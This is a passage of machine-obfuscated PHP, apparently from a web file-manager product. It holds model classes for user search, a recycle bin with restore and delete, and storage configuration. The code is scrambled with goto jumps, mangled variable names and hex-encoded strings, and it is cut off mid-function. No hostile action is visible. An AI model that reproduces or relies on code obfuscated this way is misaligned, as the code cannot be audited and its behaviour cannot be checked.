$FÏ‘æÚ¸“§[$cÍŒ®ªÚÑ[1749]] : !1; goto aÓß‚°ŠÅ; EÊ°†š÷»Ÿ: $Dã¡¬‹Ñ™± = $this->_makeOrder()->where($CÒíŸÒèöì)->selectPage(20); if (!$Dã¡¬‹Ñ™± || count($Dã¡¬‹Ñ™±[$cÍŒ®ªÚÑ[365]]) < 5 && Input::check($d“ù‡–¸, $cÍŒ®ªÚÑ[314])) { $EùŞ¹œö°ˆ = $this->_searchFromMeta($cÍŒ®ªÚÑ[437], $d“ù‡–¸, 10); $e’‹«º“ª = $this->_searchFromMeta($cÍŒ®ªÚÑ[438], $d“ù‡–¸, 10); $e‘—´à©ÒÄ = array_merge($EùŞ¹œö°ˆ, $e’‹«º“ª, $Dã¡¬‹Ñ™±[$cÍŒ®ªÚÑ[365]]); $Dã¡¬‹Ñ™±[$cÍŒ®ªÚÑ[365]] = array_unique_by_key($e‘—´à©ÒÄ, $cÍŒ®ªÚÑ[1501]); $Dã¡¬‹Ñ™±[$cÍŒ®ªÚÑ[362]][$cÍŒ®ªÚÑ[363]] = count($Dã¡¬‹Ñ™±[$cÍŒ®ªÚÑ[365]]); $Dã¡¬‹Ñ™±[$cÍŒ®ªÚÑ[362]][$cÍŒ®ªÚÑ[364]] = ceil($Dã¡¬‹Ñ™±[$cÍŒ®ªÚÑ[362]][$cÍŒ®ªÚÑ[363]] / $Dã¡¬‹Ñ™±[$cÍŒ®ªÚÑ[362]][$cÍŒ®ªÚÑ[359]]); } $this->_listDataApply($Dã¡¬‹Ñ™±[$cÍŒ®ªÚÑ[365]]); goto b‡…Ä£Öá’; AÀÛ÷œ°ïÍ: } private function _filterByGroup(&$f¥Ÿ²ó­Íİ, $E‘÷ô…ÓŸï) { $fÌ…©´ŒÎ® =& $_SERVER[Â€Á›¨õ]; if (!$E‘÷ô…ÓŸï) { return $f¥Ÿ²ó­Íİ; } foreach ($f¥Ÿ²ó­Íİ[$fÌ…©´ŒÎ®[365]] as $e¢¼¼„’¡à => &$EÂ¬ï÷˜…Ú) { $f¾°»­õ‘Ù = array_to_keyvalue($EÂ¬ï÷˜…Ú[$fÌ…©´ŒÎ®[1839]], $fÌ…©´ŒÎ®[33], $fÌ…©´ŒÎ®[1664]); if (!in_array($E‘÷ô…ÓŸï, $f¾°»­õ‘Ù)) { unset($f¥Ÿ²ó­Íİ[$fÌ…©´ŒÎ®[365]][$e¢¼¼„’¡à]); } } unset($EÂ¬ï÷˜…Ú); $f¥Ÿ²ó­Íİ[$fÌ…©´ŒÎ®[365]] = array_values($f¥Ÿ²ó­Íİ[$fÌ…©´ŒÎ®[365]]); $f¥Ÿ²ó­Íİ[$fÌ…©´ŒÎ®[362]] = array($fÌ…©´ŒÎ®[1901] => count($f¥Ÿ²ó­Íİ[$fÌ…©´ŒÎ®[365]]), $fÌ…©´ŒÎ®[1899] => $f¥Ÿ²ó­Íİ[$fÌ…©´ŒÎ®[362]][$fÌ…©´ŒÎ®[359]], $fÌ…©´ŒÎ®[1898] => 1, $fÌ…©´ŒÎ®[1900] => 1); } private function _searchFromMeta($fãîöº½«†, $Eİ×½æ¬ñ, $dàßğª­ ) { goto aöÁÁ—Š‘¥; aöÁÁ—Š‘¥: $C¯ù±­î‰ =& $_SERVER[Â€Á›¨õ]; $Eİ×½æ¬ñ = strtolower($Eİ×½æ¬ñ); $A„¶áïÔ› = array($C¯ù±­î‰[92] => $fãîöº½«†, $C¯ù±­î‰[370] => array($C¯ù±­î‰[378], "\x25{$Eİ×½æ¬ñ}\45")); goto CÏ²ëÍº›; FĞø†äè¥Æ: $bÍÁ¢­˜¡• = array_to_keyvalue($bÍÁ¢­˜¡•, $C¯ù±­î‰[33], $C¯ù±­î‰[1501]); $DË¤î‰§Â» = $this->where(array($C¯ù±­î‰[1493] => array($C¯ù±­î‰[7], $bÍÁ¢­˜¡•)))->select(); if (!$DË¤î‰§Â») { return array(); } goto F¤ëõÏ³Óæ; CÏ²ëÍº›: $A„¶áïÔ› = $this->parseWhereLike($A„¶áïÔ›); $bÍÁ¢­˜¡• = Model($C¯ù±­î‰[2124])->where($A„¶áïÔ›)->limit($dàßğª­ )->select(); if (!$bÍÁ¢­˜¡•) { return array(); } goto FĞø†äè¥Æ; F¤ëõÏ³Óæ: return $DË¤î‰§Â»; goto CİÑÂ™¢ŞÑ; CİÑÂ™¢ŞÑ: } private function _listDataApplyItem($Açê«“×÷) { $b¹ˆˆ‚ÈæÆ = array($Açê«“×÷); $this->_listDataApply($b¹ˆˆ‚ÈæÆ); return $b¹ˆˆ‚ÈæÆ[0]; } private function _listDataApply(&$Fí«Ñ¬•ÛÃ) { goto F÷­–ÑÃÛ ; Fâ¯÷„Š¢: $this->_listAppendSourceRoot($Fí«Ñ¬•ÛÃ, $f›è£äŞ¦ù); goto eìÄö—ŒÏø; F÷­–ÑÃÛ : $FŠ¢ê²ìšš =& $_SERVER[Â€Á›¨õ]; if (!$Fí«Ñ¬•ÛÃ) { return; } array_remove_key($Fí«Ñ¬•ÛÃ, $FŠ¢ê²ìšš[824]); goto eè„Ü˜ÍØ; eè„Ü˜ÍØ: $f›è£äŞ¦ù = array_to_keyvalue($Fí«Ñ¬•ÛÃ, $FŠ¢ê²ìšš[33], $FŠ¢ê²ìšš[1501]); $this->_listAppendGroup($Fí«Ñ¬•ÛÃ, $f›è£äŞ¦ù); $this->_listAppendMeta($Fí«Ñ¬•ÛÃ, $f›è£äŞ¦ù); goto Fâ¯÷„Š¢; eìÄö—ŒÏø: } private function _listAppendSourceRoot(&$d¯”Óæô“², $Bæ¹‡™—º¯) { goto CœÅÎµŸİ§; CœÅÎµŸİ§: $A¨­ÚêˆØÆ =& $_SERVER[Â€Á›¨õ]; $e¦·˜×Ç§Ù = array($A¨­ÚêˆØÆ[472] => 0, $A¨­ÚêˆØÆ[398] => SourceModel::TYPE_USER, $A¨­ÚêˆØÆ[478] => array($A¨­ÚêˆØÆ[7], $Bæ¹‡™—º¯)); $aĞÅóƒİ©» = $A¨­ÚêˆØÆ[1758]; goto c½ï†óó…ƒ; cæØö¸ğ•¢: foreach ($d¯”Óæô“² as &$EŸØï‰º°) { $EŸØï‰º°[$A¨­ÚêˆØÆ[84]] = $eùÚÅ¨™­Ù[$EŸØï‰º°[$A¨­ÚêˆØÆ[1501]]] ? $eùÚÅ¨™­Ù[$EŸØï‰º°[$A¨­ÚêˆØÆ[1501]]] : array(); } unset($EŸØï‰º°); goto a¹‡İ–ê„; c½ï†óó…ƒ: $eùÚÅ¨™­Ù = Model($A¨­ÚêˆØÆ[767])->order($A¨­ÚêˆØÆ[1759])->field($aĞÅóƒİ©»)->where($e¦·˜×Ç§Ù)->select(); $eùÚÅ¨™­Ù = array_to_keyvalue($eùÚÅ¨™­Ù, $A¨­ÚêˆØÆ[478]); $eùÚÅ¨™­Ù = array_remove_key($eùÚÅ¨™­Ù, $A¨­ÚêˆØÆ[478]); goto cæØö¸ğ•¢; a¹‡İ–ê„: } private function _listAppendGroup(&$Dİß‘ÙèË, $EÌÌß”°Å£) { goto B½âÖ²À©Ş; Cƒó®†õàÒ: $F…ã­­ÁĞ = array_to_keyvalue_group($F…ã­­ÁĞ, $cÛ‹ŞÓß‚[1501]); foreach ($F…ã­­ÁĞ as &$DãóÜÆàÎ) { $B†íí—ÄêÛ = array(); foreach ($DãóÜÆàÎ as $d†™»É´Ù) { if (!$d†™»É´Ù[$cÛ‹ŞÓß‚[1760]]) { continue; } $eõïùœÔ£ = Model($cÛ‹ŞÓß‚[1832])->listData($d†™»É´Ù[$cÛ‹ŞÓß‚[1760]]); $B†íí—ÄêÛ[] = array($cÛ‹ŞÓß‚[1664] => $d†™»É´Ù[$cÛ‹ŞÓß‚[1664]], $cÛ‹ŞÓß‚[2126] => $d¥¯ÏöÙ‚ô[$d†™»É´Ù[$cÛ‹ŞÓß‚[1664]]][$cÛ‹ŞÓß‚[28]], $cÛ‹ŞÓß‚[481] => $d¥¯ÏöÙ‚ô[$d†™»É´Ù[$cÛ‹ŞÓß‚[1664]]][$cÛ‹ŞÓß‚[481]], $cÛ‹ŞÓß‚[400] => $eõïùœÔ£); } $DãóÜÆàÎ = $B†íí—ÄêÛ; } unset($DãóÜÆàÎ); goto C½®´öã÷; B½âÖ²À©Ş: $cÛ‹ŞÓß‚ =& $_SERVER[Â€Á›¨õ]; $d¢©ó½œ°¾ = array($cÛ‹ŞÓß‚[1501] => array($cÛ‹ŞÓß‚[7], $EÌÌß”°Å£)); $F…ã­­ÁĞ = Model($cÛ‹ŞÓß‚[1746])->where($d¢©ó½œ°¾)->select(); goto D˜¦²­ÚåŸ; C½®´öã÷: foreach ($Dİß‘ÙèË as &$DãŸ£öíÒ) { $DãŸ£öíÒ[$cÛ‹ŞÓß‚[1839]] = array(); if (isset($F…ã­­ÁĞ[$DãŸ£öíÒ[$cÛ‹ŞÓß‚[1501]]])) { $DãŸ£öíÒ[$cÛ‹ŞÓß‚[1839]] = $F…ã­­ÁĞ[$DãŸ£öíÒ[$cÛ‹ŞÓß‚[1501]]]; } } unset($DãŸ£öíÒ); goto f¼ŞÁçÖ­ë; D˜¦²­ÚåŸ: $EÍÔ‚ô‡Æ´ = array_to_keyvalue($F…ã­­ÁĞ, $cÛ‹ŞÓß‚[33], $cÛ‹ŞÓß‚[1664]); $EÍÔ‚ô‡Æ´ = array_remove_value(array_unique($EÍÔ‚ô‡Æ´), $cÛ‹ŞÓß‚[491]); if (!$EÍÔ‚ô‡Æ´ || !$F…ã­­ÁĞ) { return; } goto Aé­ÉÛµ¸£; Aé­ÉÛµ¸£: $d¢©ó½œ°¾ = array($cÛ‹ŞÓß‚[1664] => array($cÛ‹ŞÓß‚[7], $EÍÔ‚ô‡Æ´)); $d¥¯ÏöÙ‚ô = Model($cÛ‹ŞÓß‚[1837])->field($cÛ‹ŞÓß‚[2125])->where($d¢©ó½œ°¾)->select(); $d¥¯ÏöÙ‚ô = array_to_keyvalue($d¥¯ÏöÙ‚ô, $cÛ‹ŞÓß‚[1664]); goto Cƒó®†õàÒ; f¼ŞÁçÖ­ë: } private function _listAppendMeta(&$c¿«ÍšåóÛ, $f½ã”¡Ó–) { goto dáÏÈø„ÇĞ; CƒÚ°±ñëÒ: foreach ($c¿«ÍšåóÛ as &$EÇ¶æÜß¹¸) { $E©×²éß‘ = array(); if (isset($d¶ÔèŠö¹Œ[$EÇ¶æÜß¹¸[$Fß“µ¤ªÉ[1501]]])) { $E©×²éß‘ = $d¶ÔèŠö¹Œ[$EÇ¶æÜß¹¸[$Fß“µ¤ªÉ[1501]]]; } $EÇ¶æÜß¹¸[$Fß“µ¤ªÉ[2128]] = array(); if (isset($E©×²éß‘[$fØòŞ·ª£ã])) { $EÇ¶æÜß¹¸[$Fß“µ¤ªÉ[2128]] = $bÔ¸ÅÇÔ¼->getUserJobInfo($E©×²éß‘[$fØòŞ·ª£ã]); } } unset($EÇ¶æÜß¹¸); goto Aª©Ã““…ó; A‰¤££íÑŒ: foreach ($d¶ÔèŠö¹Œ as &$cÑòöÇ·‹) { $fƒâ»Öâİ– = array(); foreach ($cÑòöÇ·‹ as $AĞèòËØ) { if (!in_array($AĞèòËØ[$Fß“µ¤ªÉ[92]], $e°¦Ç‚)) { $fƒâ»Öâİ–[$AĞèòËØ[$Fß“µ¤ªÉ[92]]] = $AĞèòËØ[$Fß“µ¤ªÉ[370]]; } } $cÑòöÇ·‹ = $fƒâ»Öâİ–; } unset($cÑòöÇ·‹); $bÔ¸ÅÇÔ¼ = Model($Fß“µ¤ªÉ[2127]); goto CƒÚ°±ñëÒ; b£¬ÄÎÒ: $FæÔÓ•½¶© = array($Fß“µ¤ªÉ[1501] => array($Fß“µ¤ªÉ[7], $f½ã”¡Ó–)); $d¶ÔèŠö¹Œ = Model($Fß“µ¤ªÉ[2103])->where($FæÔÓ•½¶©)->select(); $d¶ÔèŠö¹Œ = array_to_keyvalue_group($d¶ÔèŠö¹Œ, $Fß“µ¤ªÉ[1501]); goto A‰¤££íÑŒ; dáÏÈø„ÇĞ: $Fß“µ¤ªÉ =& $_SERVER[Â€Á›¨õ]; $fØòŞ·ª£ã = UserJobModel::JOB_KEY; $e°¦Ç‚ = array($Fß“µ¤ªÉ[2105]); goto b£¬ÄÎÒ; Aª©Ã““…ó: } protected function groupUserAll($C†¬«‡Íçà) { $e£Şğ¹±Îñ =& $_SERVER[Â€Á›¨õ]; if (!$C†¬«‡Íçà) { return !1; } $c¬‘ˆŸ‹„½ = Model($e£Şğ¹±Îñ[1746])->field($e£Şğ¹±Îñ[1501])->where(array($e£Şğ¹±Îñ[1664] => array($e£Şğ¹±Îñ[7], $C†¬«‡Íçà)))->select(); $c¬‘ˆŸ‹„½ = array_to_keyvalue($c¬‘ˆŸ‹„½, $e£Şğ¹±Îñ[33], $e£Şğ¹±Îñ[1501]); return array_unique($c¬‘ˆŸ‹„½); } public function userSearch($FèÏ…½ˆ‘ø, $Fô¯‚ê = "\52") { return Model($_SERVER[Â€Á›¨õ][501])->where($FèÏ…½ˆ‘ø)->field($Fô¯‚ê)->find(); } } goto eËíØ»Ş‹ä; Bòï¦×÷ : class SourceRecycleModel extends ModelBase { protected $tableName = "\151\157\x5f\x73\157\x75\x72\x63\x65\137\x72\145\x63\171\143\154\145"; protected $dataAuto = array(array("\x63\162\145\x61\164\x65\124\x69\x6d\x65", "\x74\151\155\145", "\151\156\x73\145\162\x74", "\x66\x75\x6e\x63\x74\151\x6f\x6e")); public function listData($E²…ŠÊ…Ò = false) { $cé£µø»Ü =& $_SERVER[Â€Á›¨õ]; $E²…ŠÊ…Ò = $E²…ŠÊ…Ò ? $E²…ŠÊ…Ò : USER_ID; $C‰ƒïß‹™Ø = $this->where(array($cé£µø»Ü[1493] => $E²…ŠÊ…Ò))->select(); return array_to_keyvalue($C‰ƒïß‹™Ø, $cé£µø»Ü[33], $cé£µø»Ü[390]); } public function moveToRecycle($eÊ§·Úöµô) { goto aÄˆö¿Ş×Ò; aÅ—«ô°´æ: $this->recycleMove($eÊ§·Úöµô, 1); if ($eˆ„Æ¬ÃÉë[$CóØ«ƒöàò[397]] == $CóØ«ƒöàò[86]) { $bß‘Í—„à = array($CóØ«ƒöàò[548] => array($CóØ«ƒöàò[507], $eˆ„Æ¬ÃÉë[$CóØ«ƒöàò[481]] . $eÊ§·Úöµô . $CóØ«ƒöàò[508])); $bŒî¢ŠŒÓ->where($bß‘Í—„à)->setField($CóØ«ƒöàò[417], 1); } goto EŠÖ˜¦…’’; aÄˆö¿Ş×Ò: $CóØ«ƒöàò =& $_SERVER[Â€Á›¨õ]; $bŒî¢ŠŒÓ = Model($CóØ«ƒöàò[1178]); $eˆ„Æ¬ÃÉë = $bŒî¢ŠŒÓ->sourceInfo($eÊ§·Úöµô); goto BíÀÔÒª•; BíÀÔÒª•: if (!$eˆ„Æ¬ÃÉë || $eˆ„Æ¬ÃÉë[$CóØ«ƒöàò[417]] == $CóØ«ƒöàò[86]) { return; } $b›ÉÌë×ÔÃ = array($CóØ«ƒöàò[404] => $eÊ§·Úöµô, $CóØ«ƒöàò[1493] => USER_ID, $CóØ«ƒöàò[544] => $eˆ„Æ¬ÃÉë[$CóØ«ƒöàò[398]], $CóØ«ƒöàò[545] => $eˆ„Æ¬ÃÉë[$CóØ«ƒöàò[478]], $CóØ«ƒöàò[548] => $eˆ„Æ¬ÃÉë[$CóØ«ƒöàò[481]]); $this->add($b›ÉÌë×ÔÃ); goto aÅ—«ô°´æ; EŠÖ˜¦…’’: } public function clear() { $this->remove(!1); } public function remove($a’ĞÖ¾±…Ô = false) { goto AÉõ¸•±æô; b³¯„Ÿ¹š¤: foreach ($e¾À¥£Ìá as $DŞÚ‚ÊÉ¶) { $a‹’…Ìà¤¯->targetSpaceUpdate($DŞÚ‚ÊÉ¶[$eõ ©Óµ±—[398]], $DŞÚ‚ÊÉ¶[$eõ ©Óµ±—[478]]); } goto cÊ¸Ô¾èŒ; AÉõ¸•±æô: $eõ ©Óµ±— =& $_SERVER[Â€Á›¨õ]; $a‹’…Ìà¤¯ = Model($eõ ©Óµ±—[1178]); $Bˆ†ãŠáØğ = $this->listData(); goto fÅŸ²¹ßÈ¹; fÅŸ²¹ßÈ¹: $a’ĞÖ¾±…Ô = $a’ĞÖ¾±…Ô === !1 ? !1 : $a’ĞÖ¾±…Ô; $e¾À¥£Ìá = array(); foreach ($Bˆ†ãŠáØğ as $Eë‹…ï¹–ˆ) { if ($a’ĞÖ¾±…Ô != !1 && !in_array($Eë‹…ï¹–ˆ, $a’ĞÖ¾±…Ô)) { continue; } $b˜•¦Ê¢’Ş = $a‹’…Ìà¤¯->sourceInfo($Eë‹…ï¹–ˆ); $a‹’…Ìà¤¯->remove($Eë‹…ï¹–ˆ, !1); $d²¾ï”› = $b˜•¦Ê¢’Ş[$eõ ©Óµ±—[398]] . $eõ ©Óµ±—[70] . $b˜•¦Ê¢’Ş[$eõ ©Óµ±—[478]]; $e¾À¥£Ìá[$d²¾ï”›] = array($eõ ©Óµ±—[544] => $b˜•¦Ê¢’Ş[$eõ ©Óµ±—[398]], $eõ ©Óµ±—[478] => $b˜•¦Ê¢’Ş[$eõ ©Óµ±—[478]]); $this->where(array($eõ ©Óµ±—[390] => $Eë‹…ï¹–ˆ))->delete(); } goto b³¯„Ÿ¹š¤; cÊ¸Ô¾èŒ: } public function restore($Dº„áÍÊ¹Õ = false) { $DğÕÍÇç² = $this->listData(); $this->_restoreSource($DğÕÍÇç², $Dº„áÍÊ¹Õ); } public function restoreUserAll($FãØ› ¹•) { $eƒ±¸¢¥ = $this->listData($FãØ› ¹•); $this->_restoreSource($eƒ±¸¢¥, !1); } private function _restoreSource($eÎ‹ŸÅô…•, $FŠ …ã‰ğ—) { goto föäŒàôÃ; A–Ÿ²Ê‚È½: $e’É”ºåô†->updateModifyTime($f…Õ‰÷µ¦è); goto a¶ÄºØÛÚÙ; föäŒàôÃ: $bŸÛùñØµ =& $_SERVER[Â€Á›¨õ]; $e’É”ºåô† = Model($bŸÛùñØµ[1178]); $FŠ …ã‰ğ— = $FŠ …ã‰ğ— == !1 ? !1 : $FŠ …ã‰ğ—; goto cÎÏÉ¹—¤†; cÎÏÉ¹—¤†: if (!$eÎ‹ŸÅô…•) { return !0; } $f…Õ‰÷µ¦è = array(); foreach ($eÎ‹ŸÅô…• as $Cïç™å‰Ç¶) { goto bÖªÍØÌã¢; a»¾¥¤­Ç¼: if ($a®ìŞ‰[$bŸÛùñØµ[397]] == $bŸÛùñØµ[86]) { $b›Ìí«ÇÕ = array($bŸÛùñØµ[548] => array($bŸÛùñØµ[507], $a®ìŞ‰[$bŸÛùñØµ[481]] . $Cïç™å‰Ç¶ . $bŸÛùñØµ[508])); $e’É”ºåô†->where($b›Ìí«ÇÕ)->setField($bŸÛùñØµ[417], 0); $this->restoreFolderChildren($Cïç™å‰Ç¶, $eÎ‹ŸÅô…•); } $this->where(array($bŸÛùñØµ[390] => $Cïç™å‰Ç¶))->delete(); $e’É”ºåô†->folderSizeReset($a®ìŞ‰[$bŸÛùñØµ[472]]); goto bè²Í´­©; eá¢„Í–¼¾: if ($BÉøÏô‚[$bŸÛùñØµ[417]] == $bŸÛùñØµ[86]) { continue; } $e’É”ºåô†->lockMoveStart($Cïç™å‰Ç¶); $this->recycleMove($Cïç™å‰Ç¶, 0); goto a»¾¥¤­Ç¼; bÖªÍØÌã¢: if ($FŠ …ã‰ğ— != !1 && !in_array($Cïç™å‰Ç¶, $FŠ …ã‰ğ—)) { continue; } $a®ìŞ‰ = $e’É”ºåô†->sourceInfo($Cïç™å‰Ç¶); $BÉøÏô‚ = $e’É”ºåô†->sourceInfo($a®ìŞ‰[$bŸÛùñØµ[472]]); goto eá¢„Í–¼¾; bè²Í´­©: $f…Õ‰÷µ¦è[] = $a®ìŞ‰[$bŸÛùñØµ[472]]; if ($a®ìŞ‰[$bŸÛùñØµ[397]] == $bŸÛùñØµ[86]) { $f…Õ‰÷µ¦è[] = $Cïç™å‰Ç¶; } $e’É”ºåô†->lockMoveEnd($Cïç™å‰Ç¶); goto AÍïÈãÜæì; AÍïÈãÜæì: } goto A–Ÿ²Ê‚È½; a¶ÄºØÛÚÙ: } private function restoreFolderChildren($a’ŞÚ¹®÷„, $d¤óãçŠ³Ì) { goto d¸Òã¬Á¦›; C‰’ôÎê–×: foreach ($d¤óãçŠ³Ì as $B¦¤òÙé‘®) { if ($B¦¤òÙé‘® == $a’ŞÚ¹®÷„) { continue; } if (!$f•§ÍÏÔ¥à->isParentOf($a’ŞÚ¹®÷„, $B¦¤òÙé‘®)) { continue; } $E±Øà‰Ş…¾ = $f•§ÍÏÔ¥à->sourceInfo($B¦¤òÙé‘®); if ($E±Øà‰Ş…¾[$b¤òƒÕõâ[397]] == $b¤òƒÕõâ[86]) { $d±”¿äÆ¡[] = array($b¤òƒÕõâ[548] => array($b¤òƒÕõâ[507], $E±Øà‰Ş…¾[$b¤òƒÕõâ[481]] . $B¦¤òÙé‘® . $b¤òƒÕõâ[508])); } else { $d±”¿äÆ¡[$b¤òƒÕõâ[390]][1][] = $B¦¤òÙé‘®; } } if (!$d±”¿äÆ¡[$b¤òƒÕõâ[390]][1]) { unset($d±”¿äÆ¡[$b¤òƒÕõâ[390]]); } if (!$d±”¿äÆ¡) { return; } goto fíÛÌÉ¿ÁÖ; d¸Òã¬Á¦›: $b¤òƒÕõâ =& $_SERVER[Â€Á›¨õ]; $f•§ÍÏÔ¥à = Model($b¤òƒÕõâ[1178]); $d±”¿äÆ¡ = array($b¤òƒÕõâ[390] => array($b¤òƒÕõâ[7], array())); goto C‰’ôÎê–×; fíÛÌÉ¿ÁÖ: $d±”¿äÆ¡[$b¤òƒÕõâ[390]][1] = array_unique($d±”¿äÆ¡[$b¤òƒÕõâ[390]][1]); $d±”¿äÆ¡[$b¤òƒÕõâ[932]] = $b¤òƒÕõâ[1752]; $f•§ÍÏÔ¥à->where($d±”¿äÆ¡)->setField($b¤òƒÕõâ[417], 1); goto E¸¾ÊÔƒÕ”; E¸¾ÊÔƒÕ”: } private function recycleMove($AôÕÕÂÃ‚‡, $b‘¸’ºÚòğ = 1) { $Cš»ƒå°Ôã =& $_SERVER[Â€Á›¨õ]; $e¶¥¢ÌçÅ“ = Model($Cš»ƒå°Ôã[1178]); $F™Û„İÅÉÚ = Model($Cš»ƒå°Ôã[1960]); $aî…ôæã„  = array($Cš»ƒå°Ôã[390] => $AôÕÕÂÃ‚‡); if ($b‘¸’ºÚòğ) { $e¶¥¢ÌçÅ“->where($aî…ôæã„ )->setField($Cš»ƒå°Ôã[417], 1); $F™Û„İÅÉÚ->eventRecycle($AôÕÕÂÃ‚‡, $Cš»ƒå°Ôã[1961]); } else { $fÃ¨Š„¼· = $e¶¥¢ÌçÅ“->where($aî…ôæã„ )->find(); $AÇ××øò—ñ = $fÃ¨Š„¼·[$Cš»ƒå°Ôã[397]] == $Cš»ƒå°Ôã[86]; $DÑ¯ “¼ÒÒ = $e¶¥¢ÌçÅ“->fileNameAuto($fÃ¨Š„¼·[$Cš»ƒå°Ôã[472]], $fÃ¨Š„¼·[$Cš»ƒå°Ôã[28]], REPEAT_RENAME_FOLDER, $AÇ××øò—ñ); if ($DÑ¯ “¼ÒÒ != $fÃ¨Š„¼·[$Cš»ƒå°Ôã[28]]) { $e¶¥¢ÌçÅ“->rename($AôÕÕÂÃ‚‡, $DÑ¯ “¼ÒÒ); } $e¶¥¢ÌçÅ“->where($aî…ôæã„ )->setField($Cš»ƒå°Ôã[417], 0); $F™Û„İÅÉÚ->eventRecycle($AôÕÕÂÃ‚‡, $Cš»ƒå°Ôã[1962]); } } } class StorageModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\x65\155\56\163\x74\157\x72\141\x67\145\114\x69\163\x74"; public $field = array("\x6e\141\x6d\x65", "\163\x69\x7a\145\115\141\170", "\163\x79\x73\x74\x65\x6d", "\144\145\146\x61\x75\x6c\164", "\144\x72\151\x76\145\162", "\143\157\x6e\x66\x69\x67"); public function listData($Dï›Êœ­ = false, $aŞÊï…ãó¨ = "\155\x6f\144\151\x66\171\124\151\x6d\145", $aŒó›‡—ÚÎ = false) { $Cñ‹íÁÆ =& $_SERVER[Â€Á›¨õ]; $C•Ì‚Ä±Í = parent::listData($Dï›Êœ­, $aŞÊï…ãó¨, $aŒó›‡—ÚÎ); if ($Dï›Êœ­) { return $C•Ì‚Ä±Í; } $bà’‘ÌÀ = $this->ioSizeUseGet(array_to_keyvalue($C•Ì‚Ä±Í, $Cñ‹íÁÆ[33], $Cñ‹íÁÆ[388])); foreach ($C•Ì‚Ä±Í as $Eã“È¼ã†‡ => $C¡É÷Ç›µ‰) { unset($C•Ì‚Ä±Í[$Eã“È¼ã†‡][$Cñ‹íÁÆ[6]]); $C•Ì‚Ä±Í[$Eã“È¼ã†‡][$Cñ‹íÁÆ[1650]] = isset($bà’‘ÌÀ[$C¡É÷Ç›µ‰[$Cñ‹íÁÆ[388]]]) ? $bà’‘ÌÀ[$C¡É÷Ç›µ‰[$Cñ‹íÁÆ[388]]] : 0; } return $C•Ì‚Ä±Í; } public function ioSizeUseGet($Fêê‡Ö) { goto F•×óƒ»™; e”¶Â—Î‡: $FéåˆÀ‹¯‹ = Cache::get($D¥¤®¢Ş¨); if ($FéåˆÀ‹¯‹) { return $FéåˆÀ‹¯‹; } $Céî¹•È = array($Aä›â§ï£»[760] => $Aä›â§ï£»[388], $Aä›â§ï£»[1964] => $Aä›â§ï£»[77]); goto DÏ¨Ûù…Ã­; F•×óƒ»™: $Aä›â§ï£» =& $_SERVER[Â€Á›¨õ]; if (!$Fêê‡Ö) { return array(); } $D¥¤®¢Ş¨ = $Aä›â§ï£»[1963] . implode($Aä›â§ï£»[47], $Fêê‡Ö); goto e”¶Â—Î‡; DÏ¨Ûù…Ã­: $a‰‡‰…ÇãÉ = array($Aä›â§ï£»[760] => array($Aä›â§ï£»[7], $Fêê‡Ö)); $FéåˆÀ‹¯‹ = Model($Aä›â§ï£»[731])->field($Céî¹•È)->where($a‰‡‰…ÇãÉ)->group($Aä›â§ï£»[760])->select(); $FéåˆÀ‹¯‹ = array_to_keyvalue($FéåˆÀ‹¯‹, $Aä›â§ï£»[388], $Aä›â§ï£»[77]); goto EíÄ±‡ˆ ; EíÄ±‡ˆ : Cache::set($D¥¤®¢Ş¨, $FéåˆÀ‹¯‹, 60); return $FéåˆÀ‹¯‹; goto DØÁŠÈÜ†ç; DØÁŠÈÜ†ç: } public function getConfig($A¡˜éêĞ…ß) { $bå‰×êƒÌ‘ = parent::listData($A¡˜éêĞ…ß); return json_decode($bå‰×êƒÌ‘[$_SERVER[Â€Á›¨õ][6]], !0); } public function update($Bí ˆ ±·, $d½£ö‘Üƒ) { goto dìƒÃ¤”ƒ ; dìƒÃ¤”ƒ : $a…Š˜éå‚¶ =& $_SERVER[Â€Á›¨õ]; $cê†¬»òˆ† = $d½£ö‘Üƒ[$a…Š˜éå‚¶[28]]; $B¼ƒìºÂÎ¸ = array_to_keyvalue(parent::listData(), $a…Š˜éå‚¶[28]); goto d‚Œßï¾; d‚Œßï¾: if (isset($B¼ƒìºÂÎ¸[$cê†¬»òˆ†]) && $B¼ƒìºÂÎ¸[$cê†¬»òˆ†][$a…Š˜éå‚¶[388]] != $Bí ˆ ±·) { return !1; } if (isset($d½£ö‘Üƒ[$a…Š˜éå‚¶[1965]]) && $d½£ö‘Üƒ[$a…Š˜éå‚¶[1965]] == $a…Š˜éå‚¶[86]) { $this->checkConfig($d½£ö‘Üƒ); } unset($d½£ö‘Üƒ[$a…Š˜éå‚¶[1965]]); goto f–öâ°¬Öğ; f–öâ°¬Öğ: $b™ÚÄÃâŸÍ = parent::update($Bí ˆ ±·, $d½£ö‘Üƒ); if ($b™ÚÄÃâŸÍ && $d½£ö‘Üƒ[$a…Š˜éå‚¶[34]]) { foreach ($B¼ƒìºÂÎ¸ as $CãÓğ¿‘ğ) { if ($CãÓğ¿‘ğ[$a…Š˜éå‚¶[34]] && $CãÓğ¿‘ğ[$a…Š˜éå‚¶[388]] != $Bí ˆ ±·) { parent::update($CãÓğ¿‘ğ[$a…Š˜éå‚¶[388]], array($a…Š˜éå‚¶[34] => 0)); } } } return $b™ÚÄÃâŸÍ; goto c‰ë¥ÂŸ¶; c‰ë¥ÂŸ¶: } public function add($FÒîî–øÓ) { goto AÈå½“İ‚ä; a£¼˜†ˆã½: return $Bğ”Ë‘Í´; goto BÛÎÓØ›Áõ; a±Ú¶ğ‡…Š: $this->checkConfig($FÒîî–øÓ); $Bğ”Ë‘Í´ = parent::insert($FÒîî–øÓ); if ($Bğ”Ë‘Í´ && $FÒîî–øÓ[$c‹èÅÒâÔ[34]]) { foreach ($bŠŒƒ‹¶¤ˆ as $bÓš˜Ââºœ) { if ($bÓš˜Ââºœ[$c‹èÅÒâÔ[34]]) { parent::update($bÓš˜Ââºœ[$c‹èÅÒâÔ[388]], array($c‹èÅÒâÔ[34] => 0)); } } } goto a£¼˜†ˆã½; AÈå½“İ‚ä: $c‹èÅÒâÔ =& $_SERVER[Â€Á›¨õ]; $bŠŒƒ‹¶¤ˆ = array_to_keyvalue(parent::listData(), $c‹èÅÒâÔ[28]); if (isset($bŠŒƒ‹¶¤ˆ[$FÒîî–øÓ[$c‹èÅÒâÔ[28]]])) { return !1; } goto a±Ú¶ğ‡…Š; BÛÎÓØ›Áõ: } public function checkConfig(&$BïÏ‘ÌÙïÑ) { goto FÜä•ó¹ˆƒ; FÜä•ó¹ˆƒ: $fÅ¸À·ÓÛ =& $_SERVER[Â€Á›¨õ]; $A‚¬½œ¬ˆ = strtolower($BïÏ‘ÌÙïÑ[$fÅ¸À·ÓÛ[93]]); 